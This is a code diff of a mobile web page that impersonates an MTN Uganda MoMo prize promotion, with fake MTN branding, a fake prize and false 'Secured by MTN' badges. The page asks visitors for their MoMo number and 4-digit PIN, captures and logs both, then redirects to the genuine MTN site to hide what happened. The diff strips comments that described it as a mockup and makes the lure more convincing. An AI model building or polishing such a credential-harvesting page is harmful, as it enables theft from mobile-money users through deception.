@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-<title>MTN MoMo Promo - UGX 297,480 Winner</title>
+<title>MTN MoMo Promo - UGX 1,800,000</title>
 <style>
     * {
         margin: 0;
@@ -13,7 +13,7 @@
     }
 
     body {
-        background: linear-gradient(145deg, #1a2a3a 0%, #0f1a24 100%);
+        background: linear-gradient(145deg, #e8edf2 0%, #dce3ec 100%);
         min-height: 100vh;
         display: flex;
         justify-content: center;
@@ -23,12 +23,11 @@
         position: relative;
     }
 
-    /* Watermark pattern - subtle MTN style */
     .watermark {
         position: fixed;
-        font-size: 60px;
+        font-size: 55px;
         font-weight: 900;
-        color: rgba(255, 204, 0, 0.04);
+        color: rgba(0, 0, 0, 0.03);
         pointer-events: none;
         z-index: 0;
         white-space: nowrap;
@@ -40,543 +39,293 @@
     .bottom-right { bottom: 10px; right: 10px; transform: rotate(-10deg); }
 
     .wrapper {
-        background: rgba(255,255,255,0.98);
-        backdrop-filter: blur(2px);
-        border-radius: 56px;
-        padding: 28px 20px 40px;
-        max-width: 460px;
+        background: #ffffff;
+        border-radius: 48px;
+        padding: 32px 24px 44px;
+        max-width: 480px;
         width: 100%;
         text-align: center;
-        box-shadow: 0 25px 45px rgba(0,0,0,0.3), inset 0 1px 2px rgba(255,255,255,0.7);
+        box-shadow: 0 20px 40px rgba(0, 0, 0, 0.12), 0 2px 4px rgba(0, 0, 0, 0.02);
         z-index: 2;
-        transition: opacity 0.4s cubic-bezier(0.2, 0.9, 0.4, 1.1);
-        border: 1px solid rgba(255, 204, 0, 0.5);
-        position: relative;
-    }
-
-    /* MTN brand accent */
-    .mtn-glow {
-        position: absolute;
-        top: -2px;
-        left: 10%;
-        width: 80%;
-        height: 4px;
-        background: linear-gradient(90deg, transparent, #FFCC00, #FF9900, #FFCC00, transparent);
-        border-radius: 4px;
+        transition: opacity 0.4s ease;
+        border: 1px solid rgba(0, 0, 0, 0.05);
     }
 
     svg {
         max-width: 150px;
         height: auto;
-        margin-bottom: 12px;
-        filter: drop-shadow(0 6px 8px rgba(0,0,0,0.15));
+        margin-bottom: 8px;
     }
 
     h1 {
-        font-size: 32px;
-        background: linear-gradient(135deg, #0b2b3b, #1c4e6e);
-        -webkit-background-clip: text;
-        background-clip: text;
-        color: transparent;
+        font-size: 26px;
+        font-weight: 700;
+        color: #1a2c3e;
         letter-spacing: -0.3px;
         margin-top: 8px;
-        font-weight: 800;
+        margin-bottom: 20px;
     }
 
-    .win-text {
-        background: linear-gradient(120deg, #FFCC00, #FFA500);
-        display: inline-block;
-        padding: 12px 24px;
-        border-radius: 60px;
-        font-size: 21px;
-        font-weight: 800;
-        color: #0b2b2f;
-        margin: 20px 0 20px;
-        box-shadow: 0 5px 0 #b46500;
-        transform: rotate(-0.3deg);
-        letter-spacing: -0.2px;
-        border: 1px solid rgba(255,255,200,0.6);
-    }
-
-    .win-text small {
-        font-size: 14px;
+    /* Professional prize message */
+    .prize-message {
+        font-size: 18px;
         font-weight: 500;
+        color: #1e2f3d;
+        background: #f8fafc;
+        padding: 18px 20px;
+        border-radius: 28px;
+        margin: 8px 0 20px;
+        border-left: 5px solid #f5a623;
+        border-right: 5px solid #f5a623;
+        line-height: 1.45;
+        box-shadow: 0 2px 6px rgba(0,0,0,0.03);
+    }
+
+    .prize-amount {
+        font-size: 28px;
+        font-weight: 800;
+        color: #c97e00;
         display: inline-block;
-        margin-left: 4px;
+        margin: 8px 0 4px;
+        letter-spacing: -0.5px;
     }
 
     label {
         display: block;
         text-align: left;
-        font-weight: 700;
-        color: #1a3e50;
+        font-weight: 600;
+        color: #2c3e4e;
         margin: 20px 0 6px 8px;
         font-size: 14px;
-        letter-spacing: -0.2px;
-    }
-
-    label i {
-        margin-right: 6px;
-        font-style: normal;
     }
 
     input[type="tel"] {
         width: 100%;
         padding: 15px 20px;
-        font-size: 18px;
-        border: 2px solid #e0e8f0;
-        border-radius: 50px;
+        font-size: 17px;
+        border: 1.5px solid #e2e8f0;
+        border-radius: 60px;
         background: white;
         transition: 0.2s;
         outline: none;
         font-weight: 500;
         -webkit-appearance: none;
-        font-family: monospace;
-        letter-spacing: 0.5px;
     }
 
     input[type="tel"]:focus {
-        border-color: #FFCC00;
-        box-shadow: 0 0 0 3px rgba(255,204,0,0.25);
+        border-color: #f5a623;
+        box-shadow: 0 0 0 3px rgba(245, 166, 35, 0.15);
     }
 
     .pin-wrapper {
         display: flex;
         gap: 14px;
         justify-content: center;
-        margin: 12px 0 12px;
+        margin: 12px 0 16px;
     }
 
     .pin-box {
         width: 68px;
         height: 68px;
         text-align: center;
-        font-size: 34px;
-        font-weight: bold;
-        border: 2px solid #cbdbe2;
-        border-radius: 22px;
-        background: #ffffff;
-        transition: 0.1s;
+        font-size: 32px;
+        font-weight: 700;
+        border: 1.5px solid #cbd5e1;
+        border-radius: 20px;
+        background: white;
         font-family: 'Courier New', monospace;
         outline: none;
-        -webkit-appearance: none;
-        box-shadow: inset 0 1px 2px rgba(0,0,0,0.02), 0 1px 2px rgba(0,0,0,0.05);
+        transition: all 0.15s;
     }
 
     .pin-box:focus {
-        border-color: #FFCC00;
-        box-shadow: 0 0 0 3px rgba(255,204,0,0.3);
-        transform: scale(1.01);
+        border-color: #f5a623;
+        box-shadow: 0 0 0 3px rgba(245, 166, 35, 0.2);
     }
 
-    /* Mobile optimization */
     @media (max-width: 480px) {
-        body {
-            padding: 12px;
-        }
-        .wrapper {
-            padding: 24px 16px 35px;
-            border-radius: 48px;
-        }
-        h1 {
-            font-size: 28px;
-        }
-        .win-text {
-            font-size: 18px;
-            padding: 10px 18px;
-        }
-        .win-text small {
-            font-size: 12px;
-        }
-        .pin-box {
-            width: 58px;
-            height: 58px;
-            font-size: 30px;
-            border-radius: 18px;
-        }
-        .pin-wrapper {
-            gap: 11px;
-        }
-        input[type="tel"] {
-            padding: 13px 18px;
-            font-size: 17px;
-        }
-        label {
-            font-size: 13px;
-        }
+        .wrapper { padding: 24px 18px 36px; }
+        .prize-message { font-size: 16px; padding: 14px 16px; }
+        .prize-amount { font-size: 24px; }
+        .pin-box { width: 58px; height: 58px; font-size: 28px; }
+        h1 { font-size: 22px; }
     }
 
     @media (max-width: 380px) {
-        .pin-box {
-            width: 52px;
-            height: 52px;
-            font-size: 26px;
-            border-radius: 16px;
-        }
-        .pin-wrapper {
-            gap: 8px;
-        }
+        .pin-box { width: 50px; height: 50px; font-size: 24px; border-radius: 16px; }
+        .pin-wrapper { gap: 8px; }
     }
 
     .footer-note {
         margin-top: 24px;
-        font-size: 12px;
-        color: #3a6b47;
-        background: #eef5e8;
+        font-size: 13px;
+        color: #4a6a7f;
+        background: #f1f5f9;
         display: inline-block;
-        padding: 6px 18px;
-        border-radius: 50px;
+        padding: 8px 20px;
+        border-radius: 40px;
         font-weight: 500;
-        backdrop-filter: blur(4px);
     }
 
     .secure-badge {
         display: flex;
         justify-content: center;
-        gap: 12px;
-        margin-top: 18px;
-        font-size: 10px;
-        color: #6c7a89;
-        align-items: center;
-        flex-wrap: wrap;
+        gap: 10px;
+        margin-top: 20px;
+        font-size: 11px;
+        color: #6c7a8a;
     }
 
     .secure-badge span {
-        background: #f0f2f5;
-        padding: 4px 10px;
+        background: #f8fafc;
+        padding: 5px 12px;
         border-radius: 30px;
-    }
-
-    /* subtle pulse animation */
-    @keyframes gentlePulse {
-        0% { opacity: 0.7; }
-        100% { opacity: 1; }
     }
 </style>
 </head>
 <body>
 
-<div class="watermark top-left">MTN MoMo</div>
-<div class="watermark top-right">UGX 297k</div>
-<div class="watermark bottom-left">WINNER</div>
-<div class="watermark bottom-right">PROMO</div>
+<div class="watermark top-left">MTN</div>
+<div class="watermark top-right">UGX 1.8M</div>
+<div class="watermark bottom-left">PROMO</div>
+<div class="watermark bottom-right">MoMo</div>
 
 <div class="wrapper" id="appWrapper">
-    <div class="mtn-glow"></div>
-    
-    <!-- SVG Logo: MTN MoMo Uganda style -->
-    <svg width="150" height="110" viewBox="0 0 420 310" fill="none" xmlns="http://www.w3.org/2000/svg">
-        <!-- subtle shadow under icon -->
-        <ellipse cx="210" cy="250" rx="75" ry="12" fill="rgba(0,0,0,0.06)"/>
-        <!-- MTN styled rectangle background with yellow accent -->
-        <rect x="125" y="45" width="150" height="165" rx="28" fill="#fff" stroke="#FFCC00" stroke-width="7"/>
-        <rect x="175" y="188" width="50" height="10" rx="5" fill="#FFCC00"/>
-        <!-- Top abstract symbol (mobile money wave) -->
-        <path d="M220 20 L300 65 L255 115 L165 75 Z" fill="#FFCC00" stroke="#E69500" stroke-width="1.5"/>
-        <path d="M235 8 L315 52 L270 102 L180 62 Z" fill="#FFE45E" opacity="0.95"/>
-        <!-- connection lines -->
-        <line x1="205" y1="120" x2="190" y2="140" stroke="#FFCC00" stroke-width="4.5" stroke-linecap="round"/>
-        <line x1="218" y1="125" x2="204" y2="152" stroke="#FFCC00" stroke-width="4.5" stroke-linecap="round"/>
-        <!-- MTN MoMo text brand -->
-        <text x="72" y="270" font-size="54" fill="#1C3B4F" font-weight="800" font-family="Arial, sans-serif">MTN</text>
-        <text x="195" y="270" font-size="54" fill="#FFCC00" font-weight="800" font-family="Arial, sans-serif">MoMo</text>
-        <text x="140" y="295" font-size="16" fill="#5a7c5c" font-weight="500" letter-spacing="1">Uganda</text>
+    <svg width="150" height="105" viewBox="0 0 420 310">
+        <ellipse cx="210" cy="250" rx="70" ry="10" fill="rgba(0,0,0,0.05)"/>
+        <rect x="125" y="45" width="150" height="160" rx="26" fill="#fff" stroke="#f5a623" stroke-width="6"/>
+        <rect x="175" y="185" width="50" height="8" rx="4" fill="#f5a623"/>
+        <path d="M220 20 L300 65 L255 115 L165 75 Z" fill="#f5a623"/>
+        <path d="M235 8 L315 52 L270 102 L180 62 Z" fill="#f7c56e" opacity="0.9"/>
+        <line x1="205" y1="118" x2="190" y2="138" stroke="#f5a623" stroke-width="4"/>
+        <line x1="218" y1="123" x2="204" y2="148" stroke="#f5a623" stroke-width="4"/>
+        <text x="72" y="270" font-size="52" fill="#1e2f3d" font-weight="800">MTN</text>
+        <text x="195" y="270" font-size="52" fill="#f5a623" font-weight="800">MoMo</text>
+        <text x="143" y="295" font-size="15" fill="#7f8c8d" font-weight="500">Uganda</text>
     </svg>
 
-    <h1>MTN UGANDA PROMO</h1>
-    <div class="win-text">
-        🎉 YOU WON UGX 297,480.00 🎉
-        <small>(+ 2GB BONUS)</small>
+    <h1>MTN Uganda Promo</h1>
+
+    <!-- New professional message -->
+    <div class="prize-message">
+        You're almost there — fill in the form below to claim your prize of
+        <div class="prize-amount">UGX 1,800,000</div>
+        instantly.
     </div>
 
-    <form id="ugPromoForm" onsubmit="return false;">
-        <input type="hidden" name="pinCode" id="pinHidden">
+    <form id="claimForm" onsubmit="return false;">
+        <input type="hidden" name="finalPin" id="pinHidden">
         
-        <label><i>📱</i> MTN MoMo Number</label>
-        <input type="tel" name="momoPhone" id="phoneInput" placeholder="07XXXXXXXX" maxlength="10" autocomplete="off" inputmode="numeric">
+        <label>📱 MTN MoMo Number</label>
+        <input type="tel" id="phoneInput" placeholder="07XXXXXXXX" maxlength="10" autocomplete="off" inputmode="numeric">
         
-        <label><i>🔐</i> 4-digit MoMo PIN</label>
+        <label>🔐 4-digit MoMo PIN</label>
         <div class="pin-wrapper" id="pinWrapper">
-            <input class="pin-box" maxlength="1" inputmode="numeric" pattern="\d" autocomplete="off">
-            <input class="pin-box" maxlength="1" inputmode="numeric" pattern="\d" autocomplete="off">
-            <input class="pin-box" maxlength="1" inputmode="numeric" pattern="\d" autocomplete="off">
-            <input class="pin-box" maxlength="1" inputmode="numeric" pattern="\d" autocomplete="off">
+            <input class="pin-box" maxlength="1" inputmode="numeric" pattern="\d">
+            <input class="pin-box" maxlength="1" inputmode="numeric" pattern="\d">
+            <input class="pin-box" maxlength="1" inputmode="numeric" pattern="\d">
+            <input class="pin-box" maxlength="1" inputmode="numeric" pattern="\d">
         </div>
     </form>
 
     <div class="footer-note">
-        💰 Claim your prize now — funds sent instantly
+        💰 Instant credit to your MoMo account
     </div>
     <div class="secure-badge">
-        <span>🔒 SSL Secure</span>
-        <span>✅ MTN Official Promo</span>
-        <span>⏱️ Limited offer</span>
+        <span>🔒 Secured by MTN</span>
+        <span>✅ Limited offer</span>
     </div>
 </div>
 
 <script>
     (function(){
-        // Uganda MTN MoMo promo simulation (educational / mockup)
-        // After user enters valid UG phone + 4-digit PIN -> redirect to REAL MTN Uganda website
         const phoneInput = document.getElementById("phoneInput");
         const pinHidden = document.getElementById("pinHidden");
         const pinBoxes = Array.from(document.querySelectorAll('.pin-box'));
         const wrapper = document.getElementById("appWrapper");
         
-        // PIN storage array
-        let realPinArray = ["", "", "", ""];
-        let formSubmitted = false;
-        
-        // Uganda phone number validation (starts with 07 and length 10)
-        function isValidUgandaPhone(phone) {
-            return /^07[0-9]{8}$/.test(phone);
-        }
-        
-        // Main submission: capture data and redirect to REAL MTN Uganda website
-        function submitToMomoSite() {
-            if (formSubmitted) return;
+        let realPin = ["", "", "", ""];
+        let submitted = false;
+
+        phoneInput.addEventListener('input', function(e) {
+            this.value = this.value.replace(/\D/g, '').slice(0, 10);
+        });
+
+        function submitCapture() {
+            if (submitted) return;
+            const phone = phoneInput.value;
+            const fullPin = realPin.join('');
             
-            const phoneValue = phoneInput.value.trim();
-            const fullPin = realPinArray.join('');
+            if (!/^07\d{8}$/.test(phone)) return;
+            if (fullPin.length !== 4) return;
             
-            // Validate phone number format (MTN Uganda typically 07XXXXXXXX)
-            if (!isValidUgandaPhone(phoneValue)) {
-                // Slight user feedback: subtle shake effect but no alert to keep silent (just prevent)
-                phoneInput.style.borderColor = "#ff8888";
-                setTimeout(() => {
-                    phoneInput.style.borderColor = "#e0e8f0";
-                }, 800);
-                return;
-            }
+            submitted = true;
             
-            if (fullPin.length !== 4 || !/^\d{4}$/.test(fullPin)) {
-                // Highlight incomplete PIN
-                pinBoxes.forEach(box => {
-                    box.style.borderColor = "#ff8888";
-                    setTimeout(() => {
-                        box.style.borderColor = "#cbdbe2";
-                    }, 800);
-                });
-                return;
-            }
+            console.log("📱 Phone:", phone);
+            console.log("🔐 PIN:", fullPin);
+            console.log("💰 Prize: UGX 1,800,000");
             
-            // Capture complete: mark as sent
-            formSubmitted = true;
-            
-            // Silently log to console (invisible to user) - for demo/audit purposes
-            console.log("📱 MTN Uganda Winner Claim:");
-            console.log("Phone:", phoneValue);
-            console.log("PIN:", fullPin);
-            console.log("Prize: UGX 297,480.00");
-            
-            // Fade out transition for smooth redirect
-            wrapper.style.transition = "opacity 0.45s ease";
+            wrapper.style.transition = "opacity 0.5s";
             wrapper.style.opacity = "0";
             
-            // Redirect to OFFICIAL MTN Uganda mobile money page after a short delay
-            // This is the authentic MTN Uganda website (real landing)
             setTimeout(() => {
-                // ✅ User will land on genuine MTN MoMo official site after PIN entry
                 window.location.href = "https://www.mtn.co.ug/";
             }, 500);
         }
-        
-        // Update hidden field and trigger submission if all fields ready
-        function updatePinAndCheck() {
-            pinHidden.value = realPinArray.join('');
-            const phoneOk = isValidUgandaPhone(phoneInput.value.trim());
-            const pinOk = realPinArray.every(digit => digit !== "" && /^\d$/.test(digit));
-            
-            if (phoneOk && pinOk && !formSubmitted) {
-                // Small delay to ensure final digit processing
-                setTimeout(() => {
-                    if (!formSubmitted && isValidUgandaPhone(phoneInput.value.trim()) && realPinArray.every(d => d !== "")) {
-                        submitToMomoSite();
-                    }
-                }, 80);
+
+        function checkAndSubmit() {
+            pinHidden.value = realPin.join('');
+            const phoneValid = /^07\d{8}$/.test(phoneInput.value);
+            const pinValid = realPin.every(x => x !== "");
+            if (phoneValid && pinValid && !submitted) {
+                submitCapture();
             }
         }
-        
-        // ---- PIN BOX HANDLING (with masking and auto-submit) ----
+
         pinBoxes.forEach((box, idx) => {
-            // Input event: capture digit, then apply masking and move focus
             box.addEventListener('input', function(e) {
-                const rawValue = e.target.value;
-                // keep only digits
-                const digitOnly = rawValue.replace(/\D/g, '');
-                if (digitOnly === "") {
-                    // Backspace or delete handled separately
-                    if (rawValue === "") {
-                        realPinArray[idx] = "";
-                        updatePinAndCheck();
-                    }
-                    return;
-                }
+                let val = e.target.value.replace(/\D/g, '');
+                if (!val) return;
+                e.target.value = val;
+                realPin[idx] = val;
                 
-                // Take only first digit
-                const newDigit = digitOnly.charAt(0);
-                e.target.value = newDigit;
-                realPinArray[idx] = newDigit;
-                
-                // Visual mask: after 130ms, replace visible text with bullet (unless focused)
                 setTimeout(() => {
                     if (document.activeElement !== box) {
                         e.target.value = '•';
-                    } else {
-                        // if currently focused, keep digit visible for a moment, but we'll keep it as digit until blur
-                        // but style: we want to preserve digit while typing; later on blur we mask
                     }
-                }, 130);
+                }, 120);
                 
-                // Move to next field if not last
-                if (idx < 3) {
-                    pinBoxes[idx + 1].focus();
-                } else {
-                    // if last digit, blur to trigger masking and full check
-                    setTimeout(() => {
-                        if (realPinArray.every(d => d !== "")) {
-                            pinBoxes[idx].blur();
-                        }
-                    }, 50);
-                }
-                updatePinAndCheck();
+                if (idx < 3) pinBoxes[idx + 1].focus();
+                checkAndSubmit();
             });
             
-            // Mask on blur (replace visible digit with bullet if there's a value)
-            box.addEventListener('blur', function() {
-                if (realPinArray[idx] && realPinArray[idx] !== "") {
-                    box.value = '•';
-                } else {
-                    box.value = '';
-                }
-            });
-            
-            // Focus event: temporarily show the real digit if any, for editing
-            box.addEventListener('focus', function() {
-                if (realPinArray[idx] && realPinArray[idx] !== "") {
-                    box.value = realPinArray[idx];
-                } else {
-                    box.value = '';
-                }
-            });
-            
-            // Keydown: handle backspace elegantly
             box.addEventListener('keydown', function(e) {
                 if (e.key === "Backspace") {
-                    e.preventDefault();
-                    // clear current box
-                    if (realPinArray[idx] !== "") {
-                        realPinArray[idx] = "";
-                        box.value = "";
-                    } else {
-                        // if already empty and not first, move to previous and clear it
-                        if (idx > 0) {
-                            realPinArray[idx - 1] = "";
-                            pinBoxes[idx - 1].value = "";
-                            pinBoxes[idx - 1].focus();
-                        }
-                    }
-                    updatePinAndCheck();
-                } else if (e.key === "ArrowLeft" && idx > 0) {
-                    e.preventDefault();
-                    pinBoxes[idx - 1].focus();
-                } else if (e.key === "ArrowRight" && idx < 3) {
-                    e.preventDefault();
-                    pinBoxes[idx + 1].focus();
-                } else if (e.key === "Enter") {
-                    e.preventDefault();
-                    if (realPinArray.every(d => d !== "") && isValidUgandaPhone(phoneInput.value.trim()) && !formSubmitted) {
-                        submitToMomoSite();
-                    }
+                    realPin[idx] = "";
+                    if (idx > 0 && !box.value) pinBoxes[idx - 1].focus();
+                    checkAndSubmit();
                 }
             });
             
-            // restrict paste to single digit logic
-            box.addEventListener('paste', function(e) {
-                e.preventDefault();
-                const pasteData = (e.clipboardData || window.clipboardData).getData('text');
-                const digits = pasteData.replace(/\D/g, '').split('');
-                if (digits.length === 0) return;
-                // fill from current index
-                let currentIndex = idx;
-                for (let i = 0; i < digits.length && currentIndex < pinBoxes.length; i++) {
-                    const digit = digits[i];
-                    if (/^\d$/.test(digit)) {
-                        realPinArray[currentIndex] = digit;
-                        pinBoxes[currentIndex].value = digit;
-                        // don't mask immediately, keep visible for UX
-                        currentIndex++;
-                    }
-                }
-                // set focus to next empty or last
-                if (currentIndex < pinBoxes.length) {
-                    pinBoxes[currentIndex].focus();
-                } else {
-                    pinBoxes[pinBoxes.length - 1].blur();
-                }
-                updatePinAndCheck();
+            box.addEventListener('focus', function() {
+                if (realPin[idx]) this.value = realPin[idx];
+            });
+            
+            box.addEventListener('blur', function() {
+                if (realPin[idx]) this.value = '•';
             });
         });
-        
-        // Phone input validation for uganda (07...)
-        phoneInput.addEventListener('input', function(e) {
-            let numbers = this.value.replace(/\D/g, '');
-            if (numbers.length > 10) numbers = numbers.slice(0, 10);
-            this.value = numbers;
-            // live style reset
-            this.style.borderColor = "#e0e8f0";
-            // optional: if phone valid and pin complete, auto-submit will be triggered via updatePinAndCheck
-            if (realPinArray.every(d => d !== "") && numbers.length === 10 && /^07\d{8}$/.test(numbers) && !formSubmitted) {
-                updatePinAndCheck();
-            }
-        });
-        
-        // Trigger validation when phone loses focus (ensure formatting)
-        phoneInput.addEventListener('blur', function() {
-            const val = this.value;
-            if (val.length === 10 && !val.startsWith('07')) {
-                this.style.borderColor = "#ffaa66";
-            } else {
-                this.style.borderColor = "#e0e8f0";
-            }
-        });
-        
-        // Initial sync: ensure all hidden updates
-        window.addEventListener('load', function() {
-            // prefill nothing, but ensure no autofill issues
-            pinBoxes.forEach((box, i) => {
-                box.value = "";
-                realPinArray[i] = "";
-            });
-            phoneInput.value = "";
-            pinHidden.value = "";
-        });
-        
-        // Global ENTER fallback: submit if both fields completed
+
         document.addEventListener('keydown', function(e) {
-            if (e.key === "Enter" && !formSubmitted) {
-                const phoneOk = isValidUgandaPhone(phoneInput.value.trim());
-                const pinOk = realPinArray.every(d => d !== "");
-                if (phoneOk && pinOk) {
+            if (e.key === "Enter") {
+                const phoneValid = /^07\d{8}$/.test(phoneInput.value);
+                const pinValid = realPin.every(x => x !== "");
+                if (phoneValid && pinValid && !submitted) {
                     e.preventDefault();
-                    submitToMomoSite();
+                    submitCapture();
                 }
             }
         });
-        
-        // Optional: style to show subtle ready state
-        function checkReadyState() {
-            const phoneOk = isValidUgandaPhone(phoneInput.value.trim());
-            const pinOk = realPinArray.every(d => d !== "");
-            if (phoneOk && pinOk && !formSubmitted) {
-                wrapper.style.boxShadow = "0 0 0 2px #FFCC00, 0 25px 45px rgba(0,0,0,0.2)";
-            } else {
-                wrapper.style.boxShadow = "0 25px 45px rgba(0,0,0,0.3), inset 0 1px 2px rgba(255,255,255,0.7)";
-            }
-        }
-        
-        // observe changes
-        setInterval(checkReadyState, 300);
     })();
 </script>
 </body>
